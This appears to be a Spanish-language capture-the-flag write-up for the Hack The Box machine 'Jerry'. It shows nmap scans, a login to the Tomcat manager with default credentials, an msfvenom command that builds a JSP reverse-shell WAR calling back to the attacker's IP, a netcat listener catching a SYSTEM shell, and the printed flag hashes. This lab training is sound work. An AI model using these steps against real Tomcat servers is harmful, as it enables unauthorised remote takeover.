---
layout: single
title: Jerry - Hack The Box
excerpt: "Esta maquina es bastante facililla, vamos a explotar un Tomcat aprovechandonos de un upload en una pagina, aunque primero necesitamos credenciales validas. Asi que vamos a ello."
date: 2021-9-14
classes: wide
header:
  teaser: /assets/images/htb-writeup-Jerry/Jerry_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
   - hackthebox
   - infosec
tags:
    - linux
    - tomcat
    - file upload
    - web loger
    - revershell
---

![](/assets/images/htb-writeup-Jerry/Jerry_logo.png)

# Reconocimiento

Primero vamos a realizar como siempre un reconocimiento de puertos por el protocolo **TCP**, y el output lo redirigiremos al archivo `allPorts`

```bash

h3g0c1v@kali:~/htb/jerry$ nmap --min-rate 5000 -p- --open -vvv -n -Pn -oG allPorts 10.10.10.95

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-15 20:43 CEST
Initiating SYN Stealth Scan at 20:43
Scanning 10.10.10.95 [65535 ports]
Discovered open port 8080/tcp on 10.10.10.95
Completed SYN Stealth Scan at 20:44, 26.36s elapsed (65535 total ports)
Nmap scan report for 10.10.10.95
Host is up, received user-set (0.041s latency).
Scanned at 2021-09-15 20:43:54 CEST for 26s
Not shown: 65534 filtered ports
Reason: 65534 no-responses
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE    REASON
8080/tcp open  http-proxy syn-ack ttl 127

```

Y vemos que solo tiene un puerto abierto, que es el puerto 8080.
Antes de ver que nos dice el whatweb vamos a ejecutar una herramienta llamada `extractPorts` que yo tengo previamente definidad en la `.zshrc`. Dicha herramienta esta creada por s4vitar

```bash

extractPorts allPorts 
───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: extractPorts.tmp
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ 
   2   │ [*] Extracting information...
   3   │ 
   4   │     [*] IP Address: 10.10.10.95
   5   │     [*] Open ports: 8080
   6   │ 
   7   │ [*] Ports copied to clipboard
   8   │ 
───────┴─────────────────────────────────────────────────────────────────

```

Y vamos a detectar la version y servicios que corren para el puerto 8080.

```bash

nmap -sC -sV -p8080 10.10.10.95
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-15 20:49 CEST
Nmap scan report for 10.10.10.95
Host is up (0.040s latency).

PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/7.0.88

```

Muy bien nos reporta un poco mas de informaciond. Aun asi, veamos que nos dice el whatweb.

```bash

h3g0c1v@kali:~/htb/jerry$ whatweb http://10.10.10.95:8080
http://10.10.10.95:8080 [200 OK] Apache, Country[RESERVED][ZZ], HTML5, HTTPServer[Apache-Coyote/1.1], IP[10.10.10.95], Title[Apache Tomcat/7.0.88]

```
# Consiguiendo Acceso a la Maquina

Genial, veamos que contiene ese servidor web Tomcat

![](/assets/images/htb-writeup-Jerry/Tomcat_page.png)

Y nos aparece lo siguiente. Muy bien a mi se me ocurre mirar a ver si tiene un panel login la pagina web. La ruta en la que normalmente esta almacenado el panel login en Tomcat es `/manager/html`, asi que vamos a probar.

![](/assets/images/htb-writeup-Jerry/tomcat_page.png)

Vamos a probar con las credenciales tipicas de **admin** **admin**. ¡Y vemos las credenciales! ¡Por que si! Que raro es esto, pero la hemos encontrado

![](/assets/images/htb-writeup-Jerry/credentials.png)

Bueno pues nos logeamos con las credenciales y vemos lo siguiente

![](/assets/images/htb-writeup-Jerry/dentro_tomcat.png)

Por abajo veo que hay un **upload** de archivos `.war` por lo que voy a intentar meter una revershell, para intentar ganar acceso al sistema.

Y para ello utilizaremos **msfvenom** para utilizar la reveshell hecha con **java** llamada `java/jsp_shell_reverse_tcp`.

```bash

h3g0c1v@kali:~/htb/jerry$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.24 LPORT=443 -f war > revershell.war
Payload size: 1090 bytes
Final size of war file: 1090 bytes

```

Ahora metemos el archivo `.war` en la pagina web, para que nos cree otro modulo.

![](/assets/images/htb-writeup-Jerry/revershell.png)

Y una vez metido el archivo en la maquina nos ponemos en escucha por el puerto **443**, para ver si es vulnerable.

```bash

nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.24] from (UNKNOWN) [10.10.10.95] 49192
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\apache-tomcat-7.0.88>


```
#Visualizando las Flags

¡Y si! Es vulnerable y ya hemos ganado acceso al sistema, incluso lo hemos hecho como `nt authority\system`.

```bash

C:\apache-tomcat-7.0.88>whoami
whoami
nt authority\system

```

Asi que ya hemos comprometido la maquina **Windows Jerry** y podemos ver las flags de **user.txt** y **root.txt**.

```
C:\Users\Administrator\Desktop\flags>type "2 for the price of 1.txt"
type "2 for the price of 1.txt"
user.txt
7004dbcef0f854e0fb401875f26ebd00

root.txt
04a8b36e1545a455393d067e772fe90e

```
